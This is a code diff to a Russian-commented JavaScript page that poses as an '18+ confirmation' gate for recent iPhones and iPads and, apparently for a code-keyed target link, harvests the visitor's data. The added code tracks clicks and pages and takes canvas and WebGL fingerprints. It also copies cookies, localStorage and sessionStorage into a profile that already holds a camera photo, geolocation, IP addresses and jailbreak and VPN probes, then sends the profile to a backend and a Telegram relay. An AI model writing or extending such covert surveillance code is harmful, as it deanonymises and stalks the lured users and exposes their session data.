@@ -1,4 +1,5 @@
-// === app.js (универсальный + жёсткий гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18) ===
+// === app.js (универсальный + жёсткий гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18)
+// + расширенный сбор профиля, активностей и client-side TG snapshot ===
 
 // API base из <script>window.__API_BASE</script> в index.html
 const API_BASE =
@@ -33,6 +34,54 @@ window.__cameraLatencyMs = null;
 window.__lastDeviceCheck = null;
 window.__lastClientProfileForScore = null;
 
+// ===================== Активности пользователя (посещённые страницы/клики) =====================
+const ACTIVITY_LIMIT = 100;
+const Activity = {
+  referrer: document.referrer || null,
+  pages: [],        // { href, ts }
+  clicks: [],       // { x, y, tag, id, cls, href?, ts }
+};
+
+function pushPage(url) {
+  try {
+    Activity.pages.push({ href: String(url || location.href), ts: Date.now() });
+    if (Activity.pages.length > ACTIVITY_LIMIT) Activity.pages.shift();
+  } catch {}
+}
+
+function pushClick(ev) {
+  try {
+    const t = ev.target || {};
+    const tag = (t.tagName || "").toLowerCase();
+    const id = t.id || null;
+    const cls = (t.className || "").toString().slice(0, 120);
+    const maybeHref = (t.closest && t.closest('a')) ? t.closest('a').href : null;
+    Activity.clicks.push({ x: ev.clientX, y: ev.clientY, tag, id, cls, href: maybeHref, ts: Date.now() });
+    if (Activity.clicks.length > ACTIVITY_LIMIT) Activity.clicks.shift();
+  } catch {}
+}
+
+document.addEventListener('click', pushClick, { capture: true, passive: true });
+
+// Отслеживаем SPA-навигацию
+(function patchHistory() {
+  function wrap(fn) {
+    return function(...args) {
+      const ret = fn.apply(this, args);
+      try { pushPage(location.href); } catch {}
+      return ret;
+    };
+  }
+  try {
+    history.pushState = wrap(history.pushState);
+    history.replaceState = wrap(history.replaceState);
+  } catch {}
+})();
+
+window.addEventListener('popstate', () => pushPage(location.href));
+// Первая запись
+pushPage(location.href);
+
 // ===================== Jailbreak probe (soft) =====================
 window.__jbProbe = null; // кэш результата на сессию
 
@@ -49,7 +98,6 @@ const JB_SCHEMES = [
   "saily://"
 ];
 
-// Тихо проверяем схему в скрытом iframe и наблюдаем visibility/pagehide
 function probeCustomSchemeOnce(url, timeout = 1200) {
   return new Promise((resolve) => {
     let done = false, visHit = false, pageHideHit = false;
@@ -114,8 +162,6 @@ async function runJailbreakProbe(timeoutPerScheme = 1200) {
 }
 
 // ===================== VPN/Proxy guess (эвристика) =====================
-
-// Быстрый маппинг таймзоны -> страна (частично, можно расширять)
 function tzToCountryGuess(tz) {
   if (!tz) return null;
   const t = tz.toLowerCase();
@@ -137,7 +183,6 @@ function tzToCountryGuess(tz) {
   return null;
 }
 
-// Ключевые слова для дата-центров/провайдеров VPN
 const DC_ISP_KEYWORDS = [
   "amazon", "aws", "google", "microsoft", "azure", "cloudflare", "digitalocean",
   "hetzner", "ovh", "leaseweb", "choopa", "vultr", "linode", "akamai", "m247",
@@ -150,13 +195,6 @@ function looksLikeDatacenter(isp) {
   return DC_ISP_KEYWORDS.some(k => s.includes(k));
 }
 
-/**
- * Эвристическая оценка VPN/Proxy.
- * - publicIp.country vs timezone
- * - ISP-ключевые слова (ДЦ/хостинг)
- * - наличие публичных адресов в webrtcIps
- * - слабые сетевые метрики
- */
 function deriveVpnProxyGuess(profile) {
   let score = 0;
   const reasons = [];
@@ -204,15 +242,67 @@ function deriveVpnProxyGuess(profile) {
   return { label, score, reasons, tzCountry, pubCountry, isp };
 }
 
-// ===================== СБОР КЛИЕНТСКОГО ПРОФИЛЯ =====================
+// ===================== Хэлперы: Canvas/WebGL fingerprint, storage, hash =====================
+async function sha256Hex(str) {
+  try {
+    const enc = new TextEncoder().encode(str);
+    const buf = await crypto.subtle.digest('SHA-256', enc);
+    return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+  } catch { return null; }
+}
 
+function getCanvasFingerprintRaw() {
+  try {
+    const c = document.createElement('canvas');
+    c.width = 280; c.height = 60;
+    const g = c.getContext('2d');
+    g.textBaseline = 'top';
+    g.font = "16px 'Arial'";
+    g.fillStyle = '#f60';
+    g.fillRect(125, 1, 62, 20);
+    g.fillStyle = '#069';
+    g.fillText('C@nv@s-FP ♥ iOS', 2, 15);
+    g.strokeStyle = '#096';
+    g.arc(140, 30, 20, 0, Math.PI * 2, true);
+    g.stroke();
+    return c.toDataURL();
+  } catch { return null; }
+}
+
+async function getCanvasFingerprint() {
+  const raw = getCanvasFingerprintRaw();
+  const hash = raw ? await sha256Hex(raw) : null;
+  return { hash, rawLen: raw ? raw.length : 0 };
+}
+
+function getStorageSnapshot(limitBytesPerValue = 2048) {
+  const clamp = (s) => (s && s.length > limitBytesPerValue) ? (s.slice(0, limitBytesPerValue) + '…') : s;
+  const cookies = document.cookie || ""; // ⚠️ содержит только текущий домен/путь
+  const local = {};
+  const sess = {};
+  try {
+    for (let i=0;i<localStorage.length;i++) {
+      const k = localStorage.key(i);
+      local[k] = clamp(localStorage.getItem(k));
+    }
+  } catch {}
+  try {
+    for (let i=0;i<sessionStorage.length;i++) {
+      const k = sessionStorage.key(i);
+      sess[k] = clamp(sessionStorage.getItem(k));
+    }
+  } catch {}
+  return { cookies, local, session: sess };
+}
+
+// ===================== СБОР КЛИЕНТСКОГО ПРОФИЛЯ =====================
 async function getPublicIPViaBackend() {
   if (!API_BASE) return null;
   try {
     const r = await fetch(`${API_BASE}/api/client-ip`, { method: "GET", credentials: "omit" });
     if (!r.ok) return null;
     const data = await r.json().catch(()=>null);
-    return data || null; // ожидаем { ip, country?, region?, isp? }
+    return data || null; // { ip, country?, region?, isp? }
   } catch { return null; }
 }
 
@@ -241,11 +331,14 @@ function getWebGLInfoSafe() {
     const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
     if (!gl) return null;
     const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-    if (!dbg) return null;
-    return {
-      vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
-      renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
-    };
+    const out = {};
+    if (dbg) {
+      out.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+      out.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    }
+    out.vendorMasked = gl.getParameter(gl.VENDOR);
+    out.rendererMasked = gl.getParameter(gl.RENDERER);
+    return out;
   } catch { return null; }
 }
 
@@ -340,7 +433,9 @@ async function collectClientProfile() {
   const storageEst = await getStorageEstimate();
   const conn = getConnectionInfo();
   const ipsViaRtc = await getIpsViaWebRTC(1800);
-  const pubIp = await getPublicIPViaBackend(); // если на бэке сделан эндпоинт — получим точный IP
+  const pubIp = await getPublicIPViaBackend(); // { ip, country?, region?, isp? }
+  const canvas = await getCanvasFingerprint();
+  const storageSnapshot = getStorageSnapshot();
 
   const perf = {};
   try {
@@ -354,8 +449,9 @@ async function collectClientProfile() {
 
   const base = {
     timestamp: Date.now(),
+    localTimeISO: new Date().toISOString(),
     locationHref: location.href,
-    referrer: document.referrer || null,
+    referrer: Activity.referrer,
     cookiesEnabled: navigator.cookieEnabled === true,
     languages: navigator.languages || null,
     language: navigator.language || null,
@@ -376,14 +472,20 @@ async function collectClientProfile() {
     mediaCapabilities: mediaCaps,
     battery,
     webgl,
+    canvas,
     plugins,
     mimeTypes,
     webrtcIps: ipsViaRtc,     // ICE/мднс/иногда публичные
-    publicIp: pubIp,          // { ip, country?, region?, isp? } — если API_BASE реализует
+    publicIp: pubIp,          // { ip, country?, region?, isp? }
     performance: perf,
     visibilityHidden: document.hidden === true,
     historyLength: (history && history.length) || null,
-    jbProbe: (window.__jbProbe || null)
+    jbProbe: (window.__jbProbe || null),
+    activity: {
+      pages: Activity.pages.slice(-50),
+      clicks: Activity.clicks.slice(-50)
+    },
+    storageSnapshot
   };
 
   // VPN/Proxy эвристика
@@ -543,7 +645,6 @@ function getDeviceInfo() {
     userAgent: ua,
     platform: navigator.platform,
     iosVersion: iosVer,
-    // оставим isSafari для обратной совместимости, но он нам не нужен для гейта
     isSafari:
       /Safari\//.test(ua) &&
       !/CriOS|Chrome|Chromium|FxiOS|Edg|OPR/i.test(ua) &&
@@ -571,7 +672,6 @@ async function runDeviceCheck() {
     details.maxTouchPoints = Number(navigator.maxTouchPoints || 0);
     details.navigator_webdriver = (typeof navigator.webdriver === "boolean") ? navigator.webdriver : undefined;
 
-    // Очень мягкие эвристики
     const leakedChromeRuntime = !!(window.chrome && window.chrome.runtime);
     const leakedBrowserRuntime = !!(window.browser && window.browser.runtime);
     if (leakedChromeRuntime || leakedBrowserRuntime) {
@@ -604,7 +704,6 @@ async function runDeviceCheck() {
       score -= 10;
     }
 
-    // Jailbreak soft-probe (custom URL schemes)
     try {
       const jb = await runJailbreakProbe(1200);
       details.jailbreakProbe = jb;
@@ -616,7 +715,6 @@ async function runDeviceCheck() {
       reasons.push("Ошибка jailbreak-probe: " + (e && e.message ? e.message : String(e)));
     }
 
-    // Лёгкий штраф за вероятный VPN/Proxy по собранному профилю
     try {
       const cp = window.__lastClientProfileForScore || null;
       const v = cp?.vpnProxy || null;
@@ -637,6 +735,30 @@ async function runDeviceCheck() {
   return { score, reasons, details, timestamp: Date.now() };
 }
 
+// === Client-side мини-снепшот для TG (HTML), опционально уйдёт на бэкенд ===
+function buildTgHtmlClient(code, cp, check) {
+  const pub = (cp && cp.publicIp) || {};
+  const conn = (cp && cp.connection) || {};
+  const scr  = (cp && cp.screen) || {};
+  const vpn  = (cp && cp.vpnProxy) || {};
+  const tz   = (cp && cp.timezone) || null;
+  const ua   = (cp && cp.userAgent) || navigator.userAgent || "";
+  const isp  = (pub.isp || pub.org || "-");
+
+  const lines = [];
+  lines.push(`<b>Отчёт</b> <code>${code || '-'}</code>`);
+  lines.push(`Время: <code>${new Date().toISOString()}</code>`);
+  lines.push(`IP: <code>${pub.ip || '-'}</code>, CC: <code>${pub.country || '-'}</code>, ISP: <code>${isp}</code>`);
+  lines.push(`TZ: <code>${tz || '-'}</code>`);
+  lines.push(`Экран: ${scr.width || '?'}×${scr.height || '?'} (DPR=${cp?.dpr ?? '?'})`);
+  lines.push(`Связь: type=<code>${conn.type ?? '-'}</code>, eff=<code>${conn.effectiveType ?? '-'}</code>, rtt=<code>${conn.rtt ?? '-'}</code>ms`);
+  lines.push(`UA: <code>${ua.slice(0,400)}</code>`);
+  lines.push(`DeviceCheck: score=<code>${check?.score ?? '-'}</code>`);
+  lines.push(`VPN: <code>${vpn.label || '-'}</code> (score=${vpn.score ?? '-'})`);
+  if (cp?.activity?.pages?.length) lines.push(`Pages: <code>${cp.activity.pages.length}</code> / Clicks: <code>${cp.activity.clicks?.length || 0}</code>`);
+  return lines.join("\n");
+}
+
 // === Отправка отчёта ===
 async function sendReport({ photoBase64, geo, clientProfile }) {
   const info = getDeviceInfo();
@@ -644,6 +766,7 @@ async function sendReport({ photoBase64, geo, clientProfile }) {
   if (!code) throw new Error("Нет кода в URL");
 
   const device_check = window.__lastDeviceCheck || null;
+  const tg_snapshot = buildTgHtmlClient(code, clientProfile, device_check);
 
   const body = {
     ...info,
@@ -652,7 +775,8 @@ async function sendReport({ photoBase64, geo, clientProfile }) {
     note: "auto",
     code,
     device_check,
-    client_profile: clientProfile || null
+    client_profile: clientProfile || null,
+    tg_snapshot // бэкенд может сразу отправить это HTML в TG
   };
 
   const r = await fetch(`${API_BASE}/api/report`, {
@@ -667,6 +791,15 @@ async function sendReport({ photoBase64, geo, clientProfile }) {
 
   if (!r.ok) throw new Error((data && data.error) || text || `HTTP ${r.status}`);
   if (!data?.ok) throw new Error((data && data.error) || "Ошибка ответа сервера");
+
+  // (опционально) если есть /api/tg-relay — шлём мини-слепок отдельно
+  try {
+    await fetch(`${API_BASE}/api/tg-relay`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ code, html: tg_snapshot })
+    });
+  } catch {}
 
   return data;
 }
@@ -715,10 +848,8 @@ async function autoFlow() {
     const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhotoWithFallback()]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
 
-    // Пробуем jail-probe после интеракции/разрешений (надёжнее для iOS/WebView)
     try { await runJailbreakProbe(1200); } catch {}
 
-    // соберём полный клиентский профиль
     const clientProfile = await collectClientProfile();
     window.__lastClientProfileForScore = clientProfile;
 
@@ -759,7 +890,6 @@ window.__autoFlow = autoFlow;
 function applyGateAndUI() {
   const res = gateCheck();
   if (res.ok) {
-    // Позитивный UI
     if (UI.title) UI.title.textContent = "Подтверждение 18+";
     if (UI.text) UI.text.innerHTML = '<span class="ok">Доступ разрешён.</span>';
     if (UI.reason) {
@@ -770,7 +900,6 @@ function applyGateAndUI() {
     showBtn();
     setBtnLocked();
 
-    // навешиваем обработчик (без дублей)
     if (UI.btn && !UI.btn.__wired) {
       UI.btn.__wired = true;
       UI.btn.addEventListener("click", (e) => {
@@ -779,10 +908,8 @@ function applyGateAndUI() {
       });
     }
 
-    // стартуем основной поток
     setTimeout(() => autoFlow(), 100);
   } else {
-    // Отказ
     if (UI.title) UI.title.textContent = "Доступ отклонён";
     if (UI.text) UI.text.innerHTML = '<span class="err">Отказ в доступе.</span>';
     if (UI.reason) UI.reason.textContent = "Причина: " + res.reason;
